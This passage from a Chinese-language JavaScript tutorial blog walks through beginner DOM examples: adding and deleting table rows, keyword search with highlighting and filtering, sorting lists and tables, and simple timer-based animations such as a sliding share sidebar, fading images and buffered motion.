oTab=document.getElementById(&apos;tab1&apos;);</div><div class="line">	</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	var oName=document.getElementById(&apos;name&apos;);</div><div class="line">	var oAge=document.getElementById(&apos;age&apos;);</div><div class="line">	var id=oTab.tBodies[0].rows.length+1;</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var oTr=document.createElement(&apos;tr&apos;);</div><div class="line">		</div><div class="line">		var oTd=document.createElement(&apos;td&apos;);</div><div class="line">		oTd.innerHTML=id++;	//?</div><div class="line">		oTr.appendChild(oTd);</div><div class="line">		</div><div class="line">		var oTd=document.createElement(&apos;td&apos;);</div><div class="line">		oTd.innerHTML=oName.value;</div><div class="line">		oTr.appendChild(oTd);</div><div class="line">		</div><div class="line">		var oTd=document.createElement(&apos;td&apos;);</div><div class="line">		oTd.innerHTML=oAge.value;</div><div class="line">		oTr.appendChild(oTd);</div><div class="line">		</div><div class="line">		var oTd=document.createElement(&apos;td&apos;);</div><div class="line">		oTd.innerHTML=&apos;&lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&apos;;</div><div class="line">		oTr.appendChild(oTd);</div><div class="line">		</div><div class="line">		oTd.getElementsByTagName(&apos;a&apos;)[0].onclick=function ()</div><div class="line">		&#123;</div><div class="line">			oTab.tBodies[0].removeChild(this.parentNode.parentNode); //从tBodies里面删除</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		oTab.tBodies[0].appendChild(oTr);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><h3 id="版本1：基础版本——字符串比较"><a href="#版本1：基础版本——字符串比较" class="headerlink" title="版本1：基础版本——字符串比较"></a>版本1：基础版本——字符串比较</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</div><div class="line">	var oTxt=document.getElementById(&apos;name&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</div><div class="line">		&#123;</div><div class="line">			if(oTab.tBodies[0].rows[i].cells[1].innerHTML==oTxt.value)</div><div class="line">			&#123;</div><div class="line">				oTab.tBodies[0].rows[i].style.background=&apos;yellow&apos;;</div><div class="line">			&#125;</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="版本2：忽略大小写——大小写转换"><a href="#版本2：忽略大小写——大小写转换" class="headerlink" title="版本2：忽略大小写——大小写转换"></a>版本2：忽略大小写——大小写转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</div><div class="line">	var oTxt=document.getElementById(&apos;name&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</div><div class="line">		&#123;</div><div class="line">			var sTab=oTab.tBodies[0].rows[i].cells[1].innerHTML;</div><div class="line">			var sTxt=oTxt.value;</div><div class="line">			if(sTab.toLowerCase()==sTxt.toLowerCase())</div><div class="line">			&#123;</div><div class="line">				oTab.tBodies[0].rows[i].style.background=&apos;yellow&apos;;</div><div class="line">			&#125;</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="版本3：模糊搜索——search的使用"><a href="#版本3：模糊搜索——search的使用" class="headerlink" title="版本3：模糊搜索——search的使用"></a>版本3：模糊搜索——search的使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">var str=&apos;abc&apos;;</div><div class="line">str.search((&apos;a&apos;));  //找到并返回，返回数组里的位置，没有找到返回-1</div><div class="line"></div><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</div><div class="line">	var oTxt=document.getElementById(&apos;name&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</div><div class="line">		&#123;</div><div class="line">			var sTab=oTab.tBodies[0].rows[i].cells[1].innerHTML.toLowerCase();</div><div class="line">			var sTxt=oTxt.value.toLowerCase();</div><div class="line">			if(sTab.search(sTxt)!=-1)   //</div><div class="line">			&#123;</div><div class="line">				oTab.tBodies[0].rows[i].style.background=&apos;yellow&apos;;</div><div class="line">			&#125;</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="版本4：多关键词——split"><a href="#版本4：多关键词——split" class="headerlink" title="版本4：多关键词——split"></a>版本4：多关键词——split</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">var str=&apos;abc 123 ert&apos;;</div><div class="line">var arr=str.aplit(&apos; &apos;);</div><div class="line"></div><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</div><div class="line">	var oTxt=document.getElementById(&apos;name&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</div><div class="line">		&#123;</div><div class="line">			var sTab=oTab.tBodies[0].rows[i].cells[1].innerHTML.toLowerCase();</div><div class="line">			var sTxt=oTxt.value.toLowerCase();</div><div class="line">			</div><div class="line">			var arr=sTxt.split(&apos; &apos;);</div><div class="line">			</div><div class="line">			oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</div><div class="line">			</div><div class="line">			for(var j=0;j&lt;arr.length;j++)</div><div class="line">			&#123;</div><div class="line">				if(sTab.search(arr[j])!=-1)</div><div class="line">				&#123;</div><div class="line">					oTab.tBodies[0].rows[i].style.background=&apos;yellow&apos;;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="高亮显示、筛选"><a href="#高亮显示、筛选" class="headerlink" title="高亮显示、筛选"></a>高亮显示、筛选</h3><ul>
<li>高亮</li>
<li>筛选<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">function ()  //筛选</div><div class="line">&#123;</div><div class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</div><div class="line">	var oTxt=document.getElementById(&apos;name&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</div><div class="line">		&#123;</div><div class="line">			var sTab=oTab.tBodies[0].rows[i].cells[1].innerHTML.toLowerCase();</div><div class="line">			var sTxt=oTxt.value.toLowerCase();</div><div class="line">			</div><div class="line">			var arr=sTxt.split(&apos; &apos;);</div><div class="line">			</div><div class="line">			oTab.tBodies[0].rows[i].style.display=&apos;none&apos;;    </div><div class="line">			</div><div class="line">			for(var j=0;j&lt;arr.length;j++)</div><div class="line">			&#123;</div><div class="line">				if(sTab.search(arr[j])!=-1)</div><div class="line">				&#123;</div><div class="line">					oTab.tBodies[0].rows[i].style.display=&apos;block&apos;;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h3 id="li排序"><a href="#li排序" class="headerlink" title="li排序"></a>li排序</h3><ul>
<li><p>从一个div移动另一个div</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oUl1=document.getElementById(&apos;ul1&apos;);</div><div class="line">	var oUl2=document.getElementById(&apos;ul2&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var oLi=oUl1.children[0];</div><div class="line">		</div><div class="line">		//oUl1.removeChild(oLi);</div><div class="line">		oUl2.appendChild(oLi);	//1.先把元素从原有父级上删掉	2.添加到新的父级</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;ul id=&quot;ul1&quot;&gt;</div><div class="line">	&lt;li&gt;1&lt;/li&gt;</div><div class="line">	&lt;li&gt;2&lt;/li&gt;</div><div class="line">	&lt;li&gt;3&lt;/li&gt;</div><div class="line">	&lt;li&gt;4&lt;/li&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;移动&quot; /&gt;</div><div class="line">&lt;ul id=&quot;ul2&quot;&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>第一个li移动到最后一个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oUl1=document.getElementById(&apos;ul1&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var oLi=oUl1.children[0];</div><div class="line">		</div><div class="line">		oUl1.appendChild(oLi);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;移动&quot; /&gt;</div><div class="line">&lt;ul id=&quot;ul1&quot;&gt;</div><div class="line">	&lt;li&gt;1&lt;/li&gt;</div><div class="line">	&lt;li&gt;2&lt;/li&gt;</div><div class="line">	&lt;li&gt;3&lt;/li&gt;</div><div class="line">	&lt;li&gt;4&lt;/li&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>利用appendChild排序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oUl1=document.getElementById(&apos;ul1&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var aLi=oUl1.getElementsByTagName(&apos;li&apos;);</div><div class="line">		</div><div class="line">		//aLi.sort();</div><div class="line">		var arr=[];</div><div class="line">		</div><div class="line">		for(var i=0;i&lt;aLi.length;i++)</div><div class="line">		&#123;</div><div class="line">			arr[i]=aLi[i];</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		arr.sort(function (li1, li2)&#123;</div><div class="line">			var n1=parseInt(li1.innerHTML);</div><div class="line">			var n2=parseInt(li2.innerHTML);</div><div class="line">			</div><div class="line">			return n1-n2;</div><div class="line">		&#125;);</div><div class="line">		</div><div class="line">		//alert(arr[0].innerHTML);</div><div class="line">		for(var i=0;i&lt;arr.length;i++)</div><div class="line">		&#123;</div><div class="line">			alert(&apos;该把&apos;+arr[i].innerHTML+&apos;插入到最后&apos;);</div><div class="line">			oUl1.appendChild(arr[i]);</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="表格排序"><a href="#表格排序" class="headerlink" title="表格排序"></a>表格排序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var arr=[];</div><div class="line">		</div><div class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</div><div class="line">		&#123;</div><div class="line">			arr[i]=oTab.tBodies[0].rows[i];</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		arr.sort(function (tr1, tr2)&#123;</div><div class="line">			var n1=parseInt(tr1.cells[0].innerHTML);</div><div class="line">			var n2=parseInt(tr2.cells[0].innerHTML);</div><div class="line">			</div><div class="line">			return n1-n2;</div><div class="line">		&#125;);</div><div class="line">		</div><div class="line">		for(var i=0;i&lt;arr.length;i++)</div><div class="line">		&#123;</div><div class="line">			oTab.tBodies[0].appendChild(arr[i]);</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="JS运动基础"><a href="#JS运动基础" class="headerlink" title="JS运动基础"></a>JS运动基础</h1><h2 id="运动基础"><a href="#运动基础" class="headerlink" title="运动基础"></a>运动基础</h2><ul>
<li>让Div运动起来</li>
<li>速度——物体运动的快慢</li>
<li>运动中的Bug<br>   不会停止<br>   速度取某些值会无法停止<br>   到达位置后再点击还会运动<br>   重复点击速度加快<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">var timer=null;  </div><div class="line"></div><div class="line">function startMove()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	clearInterval(timer);   //在开始运动时，关闭已有定时器</div><div class="line">	timer=setInterval(function ()&#123;</div><div class="line">		var speed=1;   // 定义一个speed变量 控制速度</div><div class="line">		</div><div class="line">		if(oDiv.offsetLeft&gt;=300)  //把运动和停止隔开(if/else)</div><div class="line">		&#123;</div><div class="line">			clearInterval(timer);  //满足条件 关闭定时器 停止运动</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			oDiv.style.left=oDiv.offsetLeft+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="运动框架及应用"><a href="#运动框架及应用" class="headerlink" title="运动框架及应用"></a>运动框架及应用</h2><h3 id="运动框架实例"><a href="#运动框架实例" class="headerlink" title="运动框架实例"></a>运动框架实例</h3><h4 id="分享到-侧边栏"><a href="#分享到-侧边栏" class="headerlink" title="分享到 侧边栏"></a>分享到 侧边栏</h4><ul>
<li>通过目标点，计算速度值<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">#div1 &#123;width:150px; height:200px; background:green; position:absolute; left:-150px;&#125;</div><div class="line">#div1 span &#123;position:absolute; width:20px; height:60px; line-height:20px; background:blue; right:-20px; top:70px;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(0);</div><div class="line">	&#125;;</div><div class="line">	oDiv.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(-150);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">var timer=null;</div><div class="line"></div><div class="line">function startMove(iTarget)</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	clearInterval(timer);</div><div class="line">	timer=setInterval(function ()&#123;</div><div class="line">		var speed=0;</div><div class="line">		</div><div class="line">		if(oDiv.offsetLeft&gt;iTarget)</div><div class="line">		&#123;</div><div class="line">			speed=-10;</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			speed=10;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		if(oDiv.offsetLeft==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			oDiv.style.left=oDiv.offsetLeft+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;</div><div class="line">	&lt;span&gt;分享到&lt;/span&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="淡入淡出的图片"><a href="#淡入淡出的图片" class="headerlink" title="淡入淡出的图片"></a>淡入淡出的图片</h4><ul>
<li>用变量存储透明度<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">#div1 &#123;width:200px; height:200px; background:red; filter:alpha(opacity:30); opacity:0.3;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.onmouseover=function ()     //鼠标移入</div><div class="line">	&#123;</div><div class="line">		startMove(100);</div><div class="line">	&#125;;</div><div class="line">	oDiv.onmouseout=function ()		//鼠标移出</div><div class="line">	&#123;</div><div class="line">		startMove(30);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">var alpha=30;</div><div class="line">var timer=null;</div><div class="line"></div><div class="line">function startMove(iTarget)</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	clearInterval(timer);  //关闭定时器</div><div class="line">	timer=setInterval(function ()&#123;</div><div class="line">		var speed=0;</div><div class="line">		</div><div class="line">		if(alpha&lt;iTarget)  //当前透明度小于目标点</div><div class="line">		&#123;</div><div class="line">			speed=10;     //速度等于10</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;					//当前透明度大于目标点</div><div class="line">			speed=-10;      //速度等于-10</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		//判断是否到达目标点</div><div class="line">		if(alpha==iTarget)  //当前透明度等于目标点</div><div class="line">		&#123;</div><div class="line">			clearInterval(timer); //关闭定时器</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			alpha+=speed;</div><div class="line">			</div><div class="line">			oDiv.style.filter=&apos;alpha(opacity:&apos;+alpha+&apos;)&apos;;</div><div class="line">			oDiv.style.opacity=alpha/100;  //opacity满的时候是1；</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="alpha"><a href="#alpha" class="headerlink" title="alpha"></a>alpha</h4><p>中文：alpha<br>解释</p>
<p>表示像素不透明性的值。像素越不透明，则隐藏越多呈现图像的背景。零 alpha 表示完全透明的像素，而最大值的 alpha 表示完全不透明的像素。</p>
<h2 id="缓冲运动"><a href="#缓冲运动" class="headerlink" title="缓冲运动"></a>缓冲运动</h2><p>逐渐变慢，最后停止<br>距离越远速度越大</p>
<ul>
<li>速度由距离决定</li>
<li>速度=(目标值-当前值)/缩放系数<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">#div1 &#123;width:100px; height:100px; background:red; position:absolute; left:600px; top:50px;&#125;</div><div class="line">#div2 &#123;width:1px; height:300px; position:absolute; left:300px; top:0; background:black;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line">function startMove()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	setInterval(function ()&#123;</div><div class="line">		var speed=(300-oDiv.offsetLeft)/10;</div><div class="line">		//speed=Math.floor(speed);</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);   //速度为正，向上取整  速度为负，向下取整</div><div class="line">		</div><div class="line">		oDiv.style.left=oDiv.offsetLeft+speed+&apos;px&apos;;</div><div class="line">		</div><div class="line">		document.title=oDiv.offsetLeft+&apos;,&apos;+speed;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line">&lt;input type=&quot;button&quot; value=&quot;开始运动&quot; onclick=&quot;startMove()&quot; /&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="实例：右侧悬浮框"><a href="#实例：右侧悬浮框" class="headerlink" title="实例：右侧悬浮框"></a>实例：右侧悬浮框</h3><p>Bug：速度取整<br>跟随页面滚动的缓冲侧边栏</p>
<ul>
<li>潜在问题：目标值不是整数时<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">#div1 &#123;width:100px; height:150px; background:red; position:absolute; right:0; bottom:0;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">window.onscroll=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	var 